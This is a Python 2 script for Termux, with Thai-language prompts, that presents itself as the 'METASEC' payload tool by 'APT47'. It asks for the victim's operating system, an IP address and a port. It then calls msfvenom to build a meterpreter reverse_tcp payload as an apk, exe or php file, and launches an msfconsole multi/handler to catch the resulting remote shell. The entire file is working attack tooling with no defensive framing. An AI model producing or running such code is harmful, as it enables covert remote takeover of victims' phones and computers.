#!/usr/bin/env python
# -- coding: utf-8 --
import os,sys
import time
import socket
import random
#Code Time
from datetime import datetime
now = datetime.now()
hour = now.hour
minute = now.minute
day = now.day
month = now.month
year = now.year

##############
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(1490)
#############

os.system ("figlet -f mono9 METASEC | lolcat -a")
time.sleep(3)
os.system ("clear")
os.system ("figlet PAYLOAD | lolcat")
os.system ("neofetch --logo")
os.system ("neofetch --ascii_distro Windows10 --logo")
os.system ("cat /data/data/com.termux/files/home/METASEC/python.txt | lolcat")
os.system ("figlet -f slant PHP | lolcat")
print
print " โดย : APT47 "
print
la = raw_input ("(ระบบปฏิบัติการของเหยื่อ)android/python/php/windows : ")
ip = raw_input ("ไอพี : ")
port = raw_input ("พอร์ท : ")
out = raw_input ("ที่จัดเก็บ payload : ")
outfile = raw_input ("ชนิดของไฟล์ : ")
print "ตัวอย่างชนิดของไฟล์ apk,exe,php"
os.system ("msfvenom -p %s/meterpreter/reverse_tcp LHOST=%s LPORT=%s -f %s > %s" % (la, ip, port, outfile, out))
time.sleep(3)
print " สร้าง payload เสร็จสิ้น กรุณารอ เพื่อไปหน้า exploit "
time.sleep(3)
os.system ("clear")
os.system ("cat /data/data/com.termux/files/home/METASEC/exploit.txt | lolcat")
print
print " โปรแกรมโดย APT47 "
print
la = raw_input ("android/python/php/windows : ")
ip = raw_input ("ไอพี : ")
port = raw_input ("พอร์ท : ")
os.system ("msfconsole -q -x 'use exploit/multi/handler; set PAYLOAD %s/meterpreter/reverse_tcp; set LHOST %s; set LPORT %s; exploit;'" % (la, ip, port,))


